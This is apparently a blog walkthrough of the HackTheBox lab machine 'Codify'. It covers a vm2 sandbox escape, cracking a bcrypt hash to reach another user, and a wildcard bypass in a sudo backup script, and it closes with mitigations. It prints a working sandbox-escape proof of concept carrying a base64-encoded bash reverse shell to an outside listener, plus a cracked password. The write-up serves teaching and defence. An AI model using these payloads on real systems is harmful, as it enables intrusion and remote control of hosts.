---
title: "HackTheBox - Codify"
author: Nasrallah
description: ""
date: 2024-04-07 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, sqlite, hashcat, crack, bash, bypass, code execution]
img_path: /assets/img/hackthebox/machines/codify
image:
    path: codify.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Codify](https://www.hackthebox.com/machines/codify) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) has a website that uses the vm2 sandbox to execute javascript code. The vm2 library is vulnerable to code execution which we exploit to get a foothold on the system. We find a database file containing a password hash that we easily crack and get to another user. The user has a sudo entry allowing him to execute a bash script that is also vulnerable allowing us to bypass an `if` check and read the root's password.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.239
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, 22 running SSH, 80 is an Apache web server with the hostname `codify.htb` and port 3000 us a `node.js` application.

## Web

After adding the hostname `codify.htb` to hosts file, we navigate to the web page.

![webpage](1.png)

The two web ports seems to have the same application.

This web application allows us to run `node.js` code in a sandbox, but there are some limitations.

![limitations](2.png)

They blocked the two modules `child_process` that allows for command execution and `fs` that's used to read and write files.

Checking the `About us` page reveals the library used for sandboxing.

![vm2](3.png)

The library is `vm2`.

Searching for vulnerabilities in this library reveals a [sandbox escape](https://github.com/advisories/GHSA-xj72-wvfv-8985) vulnerability.

We can find a POC [here](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c).

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```

Let's run the code.

![rce](4.png)

We successfully run the id command and confirmed the vulnerability.

## **Foothold**

Let's change the command to a reverse shell.

```bash
/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

> Change the ip address in the command

We base64 encode the command.

```bash
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQvOTAwMSAwPiYx
```

To get it executed we pip it to `base64 -d` and then `bash` like the following:

```bash
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQvOTAwMSAwPiYx|base64 -d|bash
```

Now we put the command in the node js code like this:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQvOTAwMSAwPiYx|base64 -d|bash');
}
`

console.log(vm.run(code))
```

We setup a listener and run the code.

![revshell](5.png)

## **Privilege Escalation**

### svc -> joshua

After looking around the system for some useful things, we find a db file in the web directory.

```terminal
svc@codify:~$ cd /var/www/
svc@codify:/var/www$ ls
contact  editor  html
svc@codify:/var/www$ cd contact/
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
svc@codify:/var/www/contact$ file tickets.db 
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
svc@codify:/var/www/contact$ 
```

The file is a `sqlite` database, we can open it using `sqlite3`.

```terminal
svc@codify:/var/www/contact$ sqlite3 tickets.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite> 
```

We found the users table that has `joshua`'s hash. Let's crack it using `hashcat` with mode 3200.

```terminal
λ hashcat -m 3200 crack.hash rockyou.txt                                         
hashcat (v6.2.6) starting                                                              
                                                                                       
                                                                              
                                                                                       
Optimizers applied:                                                                    
* Zero-Byte                                                                            
* Single-Hash                                                                          
* Single-Salt                                                                          
                                                                                       
Watchdog: Hardware monitoring interface not found on your system.                      
Watchdog: Temperature abort trigger disabled.                                          
                                                                                       
Host memory required for this attack: 116 MB                                           
                                                                                       
Dictionary cache hit:                                                                  
* Filename..: rockyou.txt                                                              
* Passwords.: 14344384                                                                 
* Bytes.....: 139921497                                                                
* Keyspace..: 14344384                                                                 
                                                                                       
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1                
                                                                                       
Session..........: hashcat                                                             
Status...........: Cracked                                                             
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))                                 
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2        
Time.Started.....: Tue Jan 02 08:50:29 2024 (1 min, 0 secs)                            
Time.Estimated...: Tue Jan 02 08:51:29 2024 (0 secs)                                   
Kernel.Feature...: Pure Kernel                                                         
Guess.Base.......: File (rockyou.txt)                                                  
Guess.Queue......: 1/1 (100.00%)                                                       
Speed.#1.........:       26 H/s (13.88ms) @ Accel:1 Loops:1 Thr:16 Vec:1               
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)          
Progress.........: 1536/14344384 (0.01%)                                               
Rejected.........: 0/1536 (0.00%)                                                      
Restore.Point....: 0/14344384 (0.00%)                                                  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4095-4096                            
Candidate.Engine.: Device Generator                                                    
```

We got the password, now we can ssh to the target.

### joshua -> root

Checking our privilege we find the following:

```terminal
Last login: Mon Jan  1 17:00:36 2024 from 10.10.16.4
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

We can run the script as root, let's see what the script does.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The script asks us for a password that is compared to the one in `/root/.creds`, if it matches it uses the password to connect to `mysql` and run some commands.

In the if statement we notice that `USER_PASS` is not enclosed with double quotes, which means that any special characters we enter are not going to be treated as a string.

The special characters we can use to bypass the check is the wild card `*`, which going to result the if statement to be true and execute the other commands:

```terminal
oshua@codify:~$ sudo /opt/scripts/mysql-backup.sh 
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

It worked! Now we need a way to get the root password passed in the `mysql` command.

[pspy](https://github.com/DominicBreuker/pspy) comes to rescue because it allows us to monitor the processes running on the system.

We upload a copy of it to the target, run it and then run the sudo command:

![root](6.png)

We got the password and successfully changed to root user.

## **Prevention and Mitigation**

### vm2

The `vm2` sandbox is discontinued, the developer has suggested migrating to [isolated-vm](https://www.npmjs.com/package/isolated-vm) .

### Password

The database file contained a password hashed with `bcrypt`, but the password was weak and we were able to crack it in a matter of seconds.

Password should be long and complex with numbers and special characters.

Password also should not be reused, the root user did that and we managed to get root access.

### Backup script

The script didn't now enclose the `$USER_PASS` with double quotes which allowed us to pass the wild card `*` and bypass the check.

Simply adding double quotes `""` around the variable in the if statement would solve this bypass vulnerability.

```bash
if [[ $DB_PASS == "$USER_PASS" ]]; then
```

Another way to harden the box is to prevent other users from seeing process that doesn't belong to them, you can achieve that by running the command:

```bash
mount -o remount,rw,hidepid=2 /proc
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## References

<https://github.com/advisories/GHSA-xj72-wvfv-8985>

<https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c>

<https://github.com/DominicBreuker/pspy>

<https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/>
